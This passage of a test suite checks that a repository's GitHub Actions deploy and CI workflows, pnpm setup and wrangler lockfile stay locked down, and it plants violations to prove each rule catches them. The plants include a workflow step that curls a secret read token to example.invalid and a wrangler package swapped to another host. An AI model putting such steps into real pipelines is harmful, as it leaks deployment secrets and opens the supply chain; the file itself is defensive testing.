    ['the preview dist deployed to production', 'artifacts', inJobEdit('deploy-production', '          name: dist-production\n', '          name: dist-preview\n')],

    // concurrency
    ['a pending run cancelled', 'concurrency', edit('  cancel-in-progress: false\n', '  cancel-in-progress: true\n')],
    ['a queue per target', 'concurrency', edit('  group: deploy\n', '  group: deploy-preview\n')],

    // actions
    ['a checkout by tag', 'actions', inJobEdit('deploy-preview', `      - uses: ${CHECKOUT}\n`, '      - uses: actions/checkout@v5\n')],
    ['actions/github-script, which runs any JavaScript', 'actions', inJobEdit('deploy-preview', `      - uses: ${DOWNLOAD}\n`, `      - uses: actions/github-script@${'a'.repeat(40)} # v7.0.1\n        with:\n          script: core.info(1)\n      - uses: ${DOWNLOAD}\n`)],
    ['the checkout one hex digit off', 'actions', inJobEdit('build-production', `      - uses: ${CHECKOUT}\n`, `      - uses: ${ACTIONS.checkout.name}@${ACTIONS.checkout.sha.slice(0, -1)}${ACTIONS.checkout.sha.endsWith('0') ? '1' : '0'} # ${ACTIONS.checkout.version}\n`)],
    ['a commit with no version beside it', 'actions', inJobEdit('build-production', `      - uses: ${CHECKOUT}\n`, `      - uses: ${ACTIONS.checkout.name}@${ACTIONS.checkout.sha}\n`)],
    ['a wrong version beside the commit', 'actions', inJobEdit('build-production', `      - uses: ${CHECKOUT}\n`, `      - uses: ${ACTIONS.checkout.name}@${ACTIONS.checkout.sha} # v5\n`)],
    ['a third-party action', 'actions', inJobEdit('deploy-production', `      - uses: ${DOWNLOAD}\n`, `      - uses: someone/deploy-action@${'b'.repeat(40)} # v1.0.0\n`)],
    ['a local action', 'actions', inJobEdit('deploy-production', `      - uses: ${DOWNLOAD}\n`, '      - uses: ./.github/actions/deploy\n')],
    ['a container action', 'actions', inJobEdit('deploy-production', `      - uses: ${DOWNLOAD}\n`, '      - uses: docker://alpine:3.20\n')],
    ['checkout at another action’s commit', 'actions', inJobEdit('build-production', `      - uses: ${CHECKOUT}\n`, `      - uses: ${ACTIONS.checkout.name}@${ACTIONS.upload.sha} # ${ACTIONS.checkout.version}\n`)],
    ['a job the pins do not name, checking out by tag', 'actions', (text) => `${text}\n  extra:\n${PREVIEW_GATE}    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    steps:\n      - uses: actions/checkout@v5\n`],
    ['a job the pins do not name, running github-script at a full commit', 'actions', (text) => `${text}\n  extra:\n${PREVIEW_GATE}    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    steps:\n      - uses: actions/github-script@${'c'.repeat(40)} # v7.0.1\n`],
    ['a download in public-checks', 'actions', inJobEdit('public-checks', `      - run: ${PUBLIC_CHECKS_RUN}\n`, `      - uses: ${DOWNLOAD}\n        with:\n          name: dist-preview\n          path: dist\n      - run: ${PUBLIC_CHECKS_RUN}\n`)],

    // public-checks
    ['public-checks without the pack’s tests', 'public-checks', inJobEdit('public-checks', ' scripts/looks-artifact.test.mjs\n', '\n')],
    ['public-checks by a name pattern', 'public-checks', inJobEdit('public-checks', '--test scripts/', '--test --test-name-pattern=the-canary-is-public-bytes scripts/')],
    [
        'the canary’s suite renamed in its file',
        'public-checks',
        (text) => text,
        { sources: { ...SOURCES, 'scripts/looks-artifact.test.mjs': SOURCES['scripts/looks-artifact.test.mjs'].replace("describe('the-canary-is-public-bytes'", "describe('the-canary-was-public-bytes'") } },
    ],
    [
        'the pin’s suite skipped',
        'public-checks',
        (text) => text,
        { sources: { ...SOURCES, 'scripts/looks-pin.test.mjs': SOURCES['scripts/looks-pin.test.mjs'].replace("\ndescribe('the-pin-is-read", `\n${['describe', 'skip'].join('.')}('the-pin-is-read`) } },
    ],
    [
        'a test skipped inside the pin’s suite',
        'public-checks',
        (text) => text,
        { sources: { ...SOURCES, 'scripts/looks-pin.test.mjs': SOURCES['scripts/looks-pin.test.mjs'].replace("\n    it('", `\n    ${['it', 'skip'].join('.')}('`) } },
    ],
    [
        'a { timeout, skip } option in the canary’s suite (the 8c3 critic’s item 4)',
        'public-checks',
        (text) => text,
        {
            sources: {
                ...SOURCES,
                'scripts/looks-artifact.test.mjs': once(
                    SOURCES['scripts/looks-artifact.test.mjs'],
                    "    it('is the literal, pinned by value, made from a full commit', () => {\n",
                    `    it('is the literal, pinned by value, made from a full commit', { timeout: 60_000, ${SKIP}: !process.env.STALL_STRICT }, () => {\n`,
                ),
            },
        },
    ],
    [
        'a t.<skip>() call inside the canary’s suite',
        'public-checks',
        (text) => text,
        {
            sources: {
                ...SOURCES,
                'scripts/looks-artifact.test.mjs': once(
                    SOURCES['scripts/looks-artifact.test.mjs'],
                    "    it('is the tree the tracked pin names', () => {\n",
                    `    it('is the tree the tracked pin names', (t) => {\n        if (!process.env.STALL_STRICT) return t.${SKIP}('not strict');\n`,
                ),
            },
        },
    ],
    [
        'an only option in the pin’s suite',
        'public-checks',
        (text) => text,
        { sources: { ...SOURCES, 'scripts/looks-pin.test.mjs': SOURCES['scripts/looks-pin.test.mjs'].replace("\n    it('", `\n    it({ ${['on', 'ly'].join('')}: true }, '`) } },
    ],
    ['a file public-checks runs, not read', 'public-checks', (text) => text, { sources: { 'scripts/deploy-workflow.test.mjs': SOURCES['scripts/deploy-workflow.test.mjs'] } }],
    ['the looks job no longer waiting for public-checks (the third 8c2 critic’s item 1)', 'public-checks', inJobEdit('looks', '    needs: public-checks\n', '')],
];

describe('the-deploy-workflow-keeps-its-keys-apart', () => {
    it('reads the real file as breaking no rule', () => {
        assert.deepEqual(problemsOf(TEXT), []);
    });

    for (const [name, rule, plant, over] of PLANTS) {
        it(`refuses ${name} (${rule})`, () => {
            const planted = plant(TEXT);
            assert.ok(over !== undefined || planted !== TEXT, 'the plant changed nothing');
            const problems = problemsOf(planted, over);
            assert.ok(
                problems.some((problem) => problem.rule === rule),
                `no ${rule} problem among: ${JSON.stringify(problems.map((problem) => problem.rule))}`,
            );
        });
    }

    it('plants every rule, and names no rule the reader does not hold', () => {
        const planted = new Set(PLANTS.map(([, rule]) => rule));
        assert.deepEqual([...RULES].sort(), [...planted].sort());
    });

    it('reads a grammar refusal as the only problem: no rule reads a tree the grammar refused', () => {
        const problems = problemsOf(`---\n${TEXT}`);
        assert.ok(problems.length > 0 && problems.every((problem) => problem.rule === 'grammar'));
    });
});

describe('the-workflow-runs-the-scripts-it-was-tested-with', () => {
    const { tree, problems } = parseWorkflow(TEXT);

    it('parses under the closed grammar', () => {
        assert.deepEqual(problems, []);
    });

    it('runs PIN_SCRIPT and PACK_SCRIPT in the looks job, each as its module holds it, under shell: bash', () => {
        const steps = tree.jobs.looks.steps;
        const pin = steps.find((step) => step.id === 'pin');
        const pack = steps.find((step) => step.env !== undefined && step.env.PINNED_TREE !== undefined);
        assert.equal(pin.run, PIN_SCRIPT);
        assert.equal(pack.run, PACK_SCRIPT);
        assert.equal(pin.shell, 'bash');
        assert.equal(pack.shell, 'bash');
        assert.ok(PACK_SCRIPT.includes(`[ "$PINNED_TREE" = "${CANARY_TREE}" ]`), 'the pack in the file names the canary’s tree, the literal the-canary-is-public-bytes rebuilds');
    });

    it('holds each script’s lines in the file as they are, ten spaces in', () => {
        for (const script of [PIN_SCRIPT, PACK_SCRIPT]) {
            const block = script
                .replace(/\n$/, '')
                .split('\n')
                .map((line) => `          ${line}`)
                .join('\n');
            assert.ok(TEXT.includes(`        run: |\n${block}\n`), 'the block is in the file, whole');
        }
    });

    it('unwraps with the CLI the unwrap’s own tests run, before anything is installed', () => {
        const steps = tree.jobs['build-preview'].steps;
        const unwrap = steps.findIndex((step) => step.run === UNWRAP_RUN);
        const install = steps.findIndex((step) => typeof step.run === 'string' && step.run.startsWith('corepack'));
        assert.ok(unwrap > 0 && unwrap < install);
    });
});

describe('the-production-build-carries-no-private-look-until-a-release', () => {
    it('reads RELEASED_LOOK_IDS from the theme table, and while it is empty the production road reads nothing private', () => {
        assert.deepEqual(FACTS.released, []);
        assert.deepEqual(
            problemsOf(TEXT).filter((problem) => problem.rule === 'production-carries-nothing'),
            [],
        );
        const { tree } = parseWorkflow(TEXT);
        const production = tree.jobs['build-production'];
        assert.equal(production.needs, undefined);
        assert.equal(production.env, undefined);
        assert.ok(!production.steps.some((step) => typeof step.uses === 'string' && step.uses.startsWith(ACTIONS.download.name)));
        assert.ok(!JSON.stringify(production).includes('STALL_LOOKS_'));
    });

    it('fails, the day a release names an id, with what step 9 must do', () => {
        const problems = problemsOf(TEXT, { released: [0x04] });
        assert.deepEqual(problems, [{ rule: 'production-carries-nothing', why: PRODUCTION_RELEASE_SENTENCE }]);
        assert.equal(PRODUCTION_RELEASE_SENTENCE, 'a release carries a private look to production: step 9 rewrites the production road and this rule');
    });
});

describe('the-deploy-workflow-pins-every-action-by-commit', () => {
    it('pins the four actions by value: the latest patch of the major each ran, by full commit (the window’s lookup, 2026-10-08)', () => {
        assert.deepEqual(JSON.parse(JSON.stringify(ACTIONS)), {
            checkout: { name: 'actions/checkout', sha: 'fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09', version: 'v5.1.0' },
            setupNode: { name: 'actions/setup-node', sha: 'a0853c24544627f65ddf259abe73b1d18a591444', version: 'v5.0.0' },
            upload: { name: 'actions/upload-artifact', sha: 'ea165f8d65b6e75b540449e92b4886f43607fa02', version: 'v4.6.2' },
            download: { name: 'actions/download-artifact', sha: 'd3f86a106a0bac45b974a628896c90dbdf5c8093', version: 'v4.3.0' },
        });
    });

    it('writes every uses: line of the file as one of them, at a full 40-hex commit with its version beside it — read off the raw text, no placeholder and no tag', () => {
        const lines = TEXT.split(/\r\n|[\n\r\u0085\u2028\u2029]/).filter((line) => /^\s*-?\s*uses:/.test(line));
        assert.ok(lines.length >= 6);
        for (const line of lines) {
            const value = line.replace(/^\s*-?\s*uses:\s*/, '');
            const m = PINNED_USES.exec(value);
            assert.ok(m !== null, `${value}: not an action at a full 40-hex commit with its version as a comment`);
            assert.ok(
                Object.values(ACTIONS).some((action) => action.name === m[1] && action.sha === m[2] && action.version === m[3]),
                `${value}: not one of the four pinned actions at its pinned commit`,
            );
        }
        assert.doesNotMatch(TEXT, /@(SHA_|v\d+\b(?! *#)|main\b|master\b)/);
    });
});

/** A throwaway repository, never this checkout: git with no global or system config, removed after this file. */
const SCRATCH = mkdtempSync(join(tmpdir(), 'deploy-workflow-'));
after(() => rmSync(SCRATCH, { recursive: true, force: true }));
let planted = 0;
const GIT_ENV = { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1' };
for (const name of ['GIT_DIR', 'GIT_WORK_TREE', 'GIT_INDEX_FILE', 'GIT_OBJECT_DIRECTORY', 'GIT_COMMON_DIR']) {
    delete GIT_ENV[name];
}

/** A repository whose `files` (`{ path: text }`) are on the disk, `tracked` of them added to its index, and `gone` of them then taken off the disk. */
function plantRepo(files, { tracked = Object.keys(files), gone = [] } = {}) {
    planted += 1;
    const dir = join(SCRATCH, `repo-${planted}`);
    mkdirSync(dir);
    const git = (...args) => execFileSync('git', ['-C', dir, ...args], { env: GIT_ENV, stdio: ['ignore', 'pipe', 'pipe'] });
    git('init', '-q');
    for (const [path, text] of Object.entries(files)) {
        mkdirSync(dirname(join(dir, path)), { recursive: true });
        writeFileSync(join(dir, path), text);
    }
    if (tracked.length > 0) {
        git('add', '--', ...tracked);
    }
    for (const path of gone) {
        unlinkSync(join(dir, path));
    }
    return dir;
}

const CI_TEXT = readFileSync(join(ROOT, '.github', 'workflows', 'ci.yml'), 'utf8');
const WORKFLOWS = { '.github/workflows/ci.yml': CI_TEXT, '.github/workflows/deploy.yml': TEXT };

/** The 8c3 critic's third workflow file: on a push to main, the looks Environment, its read token handed to curl. */
const TIDY = `name: tidy\non:\n  push:\n    branches:\n      - main\njobs:\n  tidy:\n    runs-on: ubuntu-latest\n    environment: looks\n    steps:\n      - env:\n          T: ${ex('secrets.LOOKS_READ_TOKEN')}\n        run: curl -sd "$T" https://example.invalid\n`;

/*
 * The 8c3 critic's item 2: an Environment's branch rule admits every
 * workflow file whose run is on `main`, whatever its trigger, so a third
 * file would hand out the read token, the preview token, or a review prompt
 * for a job the owner does not expect — with no dispatch at all, on a push.
 * The directory holds ci.yml and deploy.yml alone, tracked and on the disk;
 * the reader (`workflowFilesAt`) is run on this checkout and on planted
 * repositories.
 */
describe('the-workflow-directory-holds-ci-and-deploy-alone', () => {
    it('holds ci.yml and deploy.yml alone here, tracked and on the disk', () => {
        const here = workflowFilesAt(ROOT);
        assert.deepEqual(here, { tracked: [...WORKFLOW_FILES], disk: [...WORKFLOW_FILES] });
        assert.deepEqual(workflowFilesProblems(here), []);
        assert.deepEqual(workflowFilesProblems(workflowFilesAt(plantRepo(WORKFLOWS))), [], 'the positive control: the two files alone, planted');
    });

    const PLANTS_DIR = [
        ['the 8c3 critic’s tidy.yml, tracked and on the disk', { ...WORKFLOWS, '.github/workflows/tidy.yml': TIDY }, {}],
        ['tidy.yml on the disk, not tracked', { ...WORKFLOWS, '.github/workflows/tidy.yml': TIDY }, { tracked: Object.keys(WORKFLOWS) }],
        ['tidy.yml tracked, gone from the disk', { ...WORKFLOWS, '.github/workflows/tidy.yml': TIDY }, { gone: ['.github/workflows/tidy.yml'] }],
        ['a .yaml file beside them', { ...WORKFLOWS, '.github/workflows/tidy.yaml': TIDY }, {}],
        ['a file in a subdirectory', { ...WORKFLOWS, '.github/workflows/more/tidy.yml': TIDY }, {}],
        ['ci.yml gone', { '.github/workflows/deploy.yml': TEXT }, {}],
    ];
    for (const [name, files, how] of PLANTS_DIR) {
        it(`refuses ${name} (workflow-files)`, () => {
            const problems = workflowFilesProblems(workflowFilesAt(plantRepo(files, how)));
            assert.ok(
                problems.some((problem) => problem.rule === 'workflow-files'),
                JSON.stringify(problems),
            );
        });
    }
});

/** Each ci.yml plant: what it is, the rule it must yield, the edit. */
const CI_PLANTS = [
    ['a U+2028 in a comment hiding environment: looks', 'grammar', (text) => once(text, '  build-and-test:\n', `  build-and-test:\n    # note${LS}    environment: looks\n`)],
    ['branches: [main] as a flow sequence', 'grammar', (text) => once(text, '    branches:\n      - main\n', '    branches: [main]\n')],
    ['a non-ASCII character in a comment', 'grammar', (text) => once(text, '# The gate AGENTS.md section 4', '# The gate AGENTS.md §4')],
    ['a pull_request_target trigger', 'ci-triggers', (text) => once(text, '  workflow_dispatch:\n', '  workflow_dispatch:\n  pull_request_target:\n')],
    ['a workflow_run trigger', 'ci-triggers', (text) => once(text, '  workflow_dispatch:\n', '  workflow_dispatch:\n  workflow_run:\n')],
    ['a workflow_call trigger', 'ci-triggers', (text) => once(text, '  workflow_dispatch:\n', '  workflow_dispatch:\n  workflow_call:\n')],
    ['the 8c3 critic’s first line: environment: looks on build-and-test', 'ci-environment', (text) => once(text, '  build-and-test:\n    runs-on: ubuntu-latest\n', '  build-and-test:\n    runs-on: ubuntu-latest\n    environment: looks\n')],
    [
        'the 8c3 critic’s second line: a step curling the read token',
        'ci-secrets',
        (text) => once(text, '      - run: pnpm test\n', `      - run: pnpm test\n      - run: curl -sd "$T" https://example.invalid\n        env:\n          T: ${ex('secrets.LOOKS_READ_TOKEN')}\n`),
    ],
    ['secrets: inherit on a job', 'ci-secrets', (text) => once(text, '  build-and-test:\n    runs-on: ubuntu-latest\n', '  build-and-test:\n    runs-on: ubuntu-latest\n    secrets: inherit\n')],
    ['contents: write', 'ci-permissions', (text) => once(text, 'permissions:\n  contents: read\n', 'permissions:\n  contents: write\n')],
    ['id-token: write beside contents: read', 'ci-permissions', (text) => once(text, 'permissions:\n  contents: read\n', 'permissions:\n  contents: read\n  id-token: write\n')],
    ['permissions: write-all on the layout job', 'ci-permissions', (text) => once(text, '  layout:\n', '  layout:\n    permissions: write-all\n')],
    ['no permissions at all (the repository default)', 'ci-permissions', (text) => once(text, 'permissions:\n  contents: read\n\n', '')],
    ['an install that loads pnpm’s hook', 'ci-installs', (text) => once(text, 'jobs:\n  build-and-test:', 'jobs:\n  build-and-test:').replace('      - run: pnpm install --frozen-lockfile --ignore-pnpmfile\n', '      - run: pnpm install --frozen-lockfile\n')],
];

/*
 * The 8c3 critic's item 2, ci.yml's half: it runs on every push to `main`,
 * so it is read under the same closed grammar as deploy.yml and holds no
 * key: no trigger but push, pull_request and workflow_dispatch, no
 * Environment, no secret, a token that reads and nothing more — and its
 * installs skip pnpm's hook file, as the deploy road's do. Each rule
 * planted; `ciProblems` documents why the file is not pinned whole.
 */
describe('the-ci-workflow-holds-no-key', () => {
    it('reads the real ci.yml as breaking no rule', () => {
        assert.deepEqual(ciProblems(CI_TEXT), []);
    });

    for (const [name, rule, plant] of CI_PLANTS) {
        it(`refuses ${name} (${rule})`, () => {
            const text = plant(CI_TEXT);
            assert.notEqual(text, CI_TEXT, 'the plant changed nothing');
            const problems = ciProblems(text);
            assert.ok(
                problems.some((problem) => problem.rule === rule),
                `no ${rule} problem among: ${JSON.stringify(problems.map((problem) => problem.rule))}`,
            );
        });
    }

    it('refuses the critic’s two lines together, each by its own rule', () => {
        const both = CI_PLANTS[7][2](CI_PLANTS[6][2](CI_TEXT));
        const rules = new Set(ciProblems(both).map((problem) => problem.rule));
        assert.ok(rules.has('ci-environment') && rules.has('ci-secrets'), [...rules].join(', '));
    });

    it('plants every rule, and names no rule the reader does not hold', () => {
        assert.deepEqual([...CI_RULES].sort(), [...new Set(CI_PLANTS.map(([, rule]) => rule))].sort());
    });
});

const TRACKED = trackedPathsAt(ROOT);
const readTracked = (path) => readFileSync(join(ROOT, path), 'utf8');
/** `read` with `over` (`{ path: text }`) standing in for those files. */
const readWith = (over) => (path) => (Object.prototype.hasOwnProperty.call(over, path) ? over[path] : readTracked(path));
const ROOT_PKG = readTracked('package.json');
/** The root's `packageManager` as tracked: the version and its pinned hash. */
const PINNED_PNPM = `${PNPM_PACKAGE_MANAGER}+sha512.${PNPM_PACKAGE_MANAGER_SHA512}`;
const withPackageManager = (value) => once(ROOT_PKG, `"packageManager": "${PINNED_PNPM}"`, `"packageManager": ${JSON.stringify(value)}`);
const HASH = 'ab'.repeat(64);

/** Each hook plant: what it is, the rule it must yield, the tracked paths, the files read in their place, the hash pinned. */
const HOOK_PLANTS = [
    ['a .pnpmfile.cjs tracked at the root', 'hook-file', [...TRACKED, '.pnpmfile.cjs'], { '.pnpmfile.cjs': 'module.exports = { hooks: {} };\n' }],
    ['a .pnpmfile.mjs tracked in deploy/', 'hook-file', [...TRACKED, 'deploy/.pnpmfile.mjs'], { 'deploy/.pnpmfile.mjs': 'export const hooks = {};\n' }],
    ['a pnpmfile.js in worker-icons/', 'hook-file', [...TRACKED, 'worker-icons/pnpmfile.js'], { 'worker-icons/pnpmfile.js': '' }],
    ['pnpmfile= in a tracked .npmrc', 'hook-settings', [...TRACKED, '.npmrc'], { '.npmrc': 'pnpmfile=./scripts/hook.cjs\n' }],
    ['global-pnpmfile= in deploy/.npmrc', 'hook-settings', [...TRACKED, 'deploy/.npmrc'], { 'deploy/.npmrc': 'global-pnpmfile=/tmp/h.cjs\n' }],
    ['configDependencies in pnpm-workspace.yaml', 'hook-settings', TRACKED, { 'pnpm-workspace.yaml': `${readTracked('pnpm-workspace.yaml')}configDependencies:\n  hooks: 1.0.0+sha512-x\n` }],
    ['pnpmfile in pnpm-workspace.yaml', 'hook-settings', TRACKED, { 'pnpm-workspace.yaml': `${readTracked('pnpm-workspace.yaml')}pnpmfile: scripts/hook.cjs\n` }],
    ['configDependencies in package.json’s pnpm field', 'hook-settings', TRACKED, { 'package.json': once(ROOT_PKG, '"pnpm": {', '"pnpm": {\n    "configDependencies": {},') }],
    ['another pnpm version', 'package-manager', TRACKED, { 'package.json': withPackageManager('pnpm@10.24.1') }],
    ['pnpm from a URL', 'package-manager', TRACKED, { 'package.json': withPackageManager('pnpm@https://example.invalid/pnpm.tgz') }],
    ['a hash that is not 128 hex', 'package-manager', TRACKED, { 'package.json': withPackageManager(`${PNPM_PACKAGE_MANAGER}+sha512.abc`) }],
    ['no packageManager', 'package-manager', TRACKED, { 'package.json': once(ROOT_PKG, `  "packageManager": "${PINNED_PNPM}",\n`, '') }],
    ['the hash left out once one is pinned', 'package-manager', TRACKED, { 'package.json': withPackageManager(PNPM_PACKAGE_MANAGER) }],
    ['another hash than the pinned one', 'package-manager', TRACKED, { 'package.json': withPackageManager(`${PNPM_PACKAGE_MANAGER}+sha512.${'cd'.repeat(64)}`) }],
    ['the pinned hash in capitals', 'package-manager', TRACKED, { 'package.json': withPackageManager(`${PNPM_PACKAGE_MANAGER}+sha512.${PNPM_PACKAGE_MANAGER_SHA512.toUpperCase()}`) }],
    ['no package.json tracked at the root', 'package-manager', TRACKED.filter((path) => path !== 'package.json'), {}],
    ['a packageManager in deploy/package.json', 'package-manager', TRACKED, { 'deploy/package.json': readTracked('deploy/package.json').replace('{', '{\n  "packageManager": "npm@10.0.0",') }],
];

/*
 * The 8c3 critic's item 3: `pnpm install --ignore-scripts` still loads
 * `.pnpmfile.cjs` (measured on pnpm 10.24.0, offline; and again by this
 * step's builder: a hook's marker written without `--ignore-pnpmfile`, not
 * with it), and corepack runs `packageManager` as pnpm before any install.
 * So every install in both workflow files carries `--ignore-pnpmfile`
 * (rules `installs` and `ci-installs`), and the tracked tree holds no hook,
 * names none, and pins pnpm: `pnpm@10.24.0` with its `+sha512.` hash,
 * required since `PNPM_PACKAGE_MANAGER_SHA512` was set (2026-10-09, the
 * owner's yes for one registry lookup: npm's `dist.integrity` for the
 * tarball, read as hex). corepack refuses a tarball that does not match it.
 */
describe('no-install-loads-a-pnpm-hook', () => {
    it('reads the tracked tree as loading no hook, and pins pnpm by value', () => {
        assert.deepEqual(pnpmHookProblems({ paths: TRACKED, read: readTracked }), []);
        assert.equal(PNPM_PACKAGE_MANAGER, 'pnpm@10.24.0');
        assert.equal(
            PNPM_PACKAGE_MANAGER_SHA512,
            '01ff8ae71b4419903b65c60fb2dc9d34cf8bb6e06d03bde112ef38f7a34d6904c424ba66bea5cdcf12890230bf39f9580473140ed9c946fef328b6e5238a345a',
            'the sha512 npm states for pnpm 10.24.0, read 2026-10-09',
        );
        assert.equal(JSON.parse(ROOT_PKG).packageManager, PINNED_PNPM);
    });

    it('holds packageManager to whichever hash it is handed', () => {
        const hashed = { 'package.json': withPackageManager(`${PNPM_PACKAGE_MANAGER}+sha512.${HASH}`) };
        assert.deepEqual(pnpmHookProblems({ paths: TRACKED, read: readWith(hashed), sha512: HASH }), []);
        assert.ok(pnpmHookProblems({ paths: TRACKED, read: readWith(hashed) }).some((problem) => problem.rule === 'package-manager'));
    });

    it('carries --ignore-pnpmfile on every pnpm install of both workflow files', () => {
        for (const text of [TEXT, CI_TEXT]) {
            const installs = text.split('\n').filter((line) => /\bpnpm install\b/.test(line) && !/^\s*#/.test(line));
            assert.ok(installs.length >= 2);
            for (const line of installs) {
                assert.ok(line.includes('--ignore-pnpmfile'), line);
            }
        }
    });

    for (const [name, rule, paths, over, sha512] of HOOK_PLANTS) {
        it(`refuses ${name} (${rule})`, () => {
            const problems = pnpmHookProblems({ paths, read: readWith(over), ...(sha512 === undefined ? {} : { sha512 }) });
            assert.ok(
                problems.some((problem) => problem.rule === rule),
                `no ${rule} problem among: ${JSON.stringify(problems)}`,
            );
        });
    }

    it('sees a hook file tracked in a planted repository, through the reader', () => {
        const dir = plantRepo({ 'package.json': ROOT_PKG, '.pnpmfile.cjs': 'module.exports = {};\n' });
        const paths = trackedPathsAt(dir);
        assert.deepEqual(paths, ['.pnpmfile.cjs', 'package.json']);
        assert.ok(pnpmHookProblems({ paths, read: (path) => readFileSync(join(dir, path), 'utf8') }).some((problem) => problem.rule === 'hook-file'));
    });

    it('plants every rule, and names no rule the reader does not hold', () => {
        assert.deepEqual([...HOOK_RULES].sort(), [...new Set(HOOK_PLANTS.map(([, rule]) => rule))].sort());
    });
});

const DEPLOY_PKG = JSON.parse(readFileSync(join(ROOT, 'deploy', 'package.json'), 'utf8'));
const DEPLOY_LOCK = JSON.parse(readFileSync(join(ROOT, 'deploy', 'package-lock.json'), 'utf8'));
const WRANGLER_FACTS = {
    pkg: DEPLOY_PKG,
    lock: DEPLOY_LOCK,
    rootPkg: JSON.parse(ROOT_PKG),
    rootNames: readdirSync(ROOT),
    deployNames: readdirSync(join(ROOT, 'deploy')),
    tracked: TRACKED,
};
/** The lockfile with one package's entry edited. */
const lockWith = (key, change) => ({ ...DEPLOY_LOCK, packages: { ...DEPLOY_LOCK.packages, [key]: change({ ...DEPLOY_LOCK.packages[key] }) } });
const ANOTHER = Object.keys(DEPLOY_LOCK.packages).find((key) => key !== '' && key !== 'node_modules/wrangler');

/** Each wrangler plant: what it is, the rule it must yield, the facts it changes. */
const WRANGLER_PLANTS = [
    ['wrangler by a range', 'wrangler-pin', { pkg: { ...DEPLOY_PKG, devDependencies: { ...DEPLOY_PKG.devDependencies, wrangler: `^${DEPLOY_PKG.devDependencies.wrangler}` } } }],
    ['the lockfile at another wrangler', 'wrangler-pin', { lock: lockWith('node_modules/wrangler', (entry) => ({ ...entry, version: '0.0.1' })) }],
    ['wrangler in the root devDependencies', 'wrangler-root', { rootPkg: { ...JSON.parse(ROOT_PKG), devDependencies: { ...JSON.parse(ROOT_PKG).devDependencies, wrangler: '4.0.0' } } }],
    ['a wrangler.toml at the root', 'wrangler-root', { rootNames: [...WRANGLER_FACTS.rootNames, 'wrangler.toml'] }],
    [
        'the 8c3 critic’s edit: wrangler from another host, its integrity changed',
        'wrangler-registry',
        { lock: lockWith('node_modules/wrangler', (entry) => ({ ...entry, resolved: 'https://example.invalid/wrangler/-/wrangler-4.143.0.tgz', integrity: `sha512-${'A'.repeat(86)}==` })) },
    ],
    ['a package from a registry-looking host', 'wrangler-registry', { lock: lockWith(ANOTHER, (entry) => ({ ...entry, resolved: entry.resolved.replace(NPM_REGISTRY, 'https://registry.npmjs.org.example.invalid/') })) }],
    ['a package with no resolved', 'wrangler-registry', { lock: lockWith(ANOTHER, ({ resolved, ...entry }) => entry) }],
    ['a lockfile that lists no package', 'wrangler-registry', { lock: { ...DEPLOY_LOCK, packages: { '': DEPLOY_LOCK.packages[''] } } }],
    ['a package with no integrity', 'wrangler-integrity', { lock: lockWith(ANOTHER, ({ integrity, ...entry }) => entry) }],
    ['a package with a sha1 integrity', 'wrangler-integrity', { lock: lockWith(ANOTHER, (entry) => ({ ...entry, integrity: `sha1-${'A'.repeat(27)}=` })) }],
    ['a deploy/.npmrc on the disk', 'npmrc', { deployNames: [...WRANGLER_FACTS.deployNames, '.npmrc'] }],
    ['a tracked .npmrc at the root (the 8c3 critic’s re-review, item 8)', 'npmrc', { tracked: [...TRACKED, '.npmrc'] }],
    ['a tracked .npmrc in a subdirectory', 'npmrc', { tracked: [...TRACKED, 'worker-icons/.npmrc'] }],
];

/*
 * wrangler is the one package that runs holding a Cloudflare token, so its
 * install is held whole: one exact version in deploy/'s package and
 * lockfile, never at the root and no wrangler config there to steer it
 * (7B-1), and — the 8c3 critic's item 5 — every package of the lockfile
 * from the npm registry with a sha512 integrity, and no tracked .npmrc
 * anywhere (the re-review's item 8), nor one in deploy/ on the disk.
 */
describe('the-deploy-workflow-takes-wrangler-from-its-own-pinned-package', () => {
    it('reads deploy/ as breaking no rule', () => {
        assert.deepEqual(wranglerProblems(WRANGLER_FACTS), []);
        assert.equal(NPM_REGISTRY, 'https://registry.npmjs.org/');
    });

    for (const [name, rule, over] of WRANGLER_PLANTS) {
        it(`refuses ${name} (${rule})`, () => {
            const problems = wranglerProblems({ ...WRANGLER_FACTS, ...over });
            assert.ok(
                problems.some((problem) => problem.rule === rule),
                `no ${rule} problem among: ${JSON.stringify(problems.map((problem) => problem.rule))}`,
            );
        });
    }

    it('plants every rule, and names no rule the reader does not hold', () => {
        assert.deepEqual([...WRANGLER_RULES].sort(), [...new Set(WRANGLER_PLANTS.map(([, rule]) => rule))].sort());
    });
});
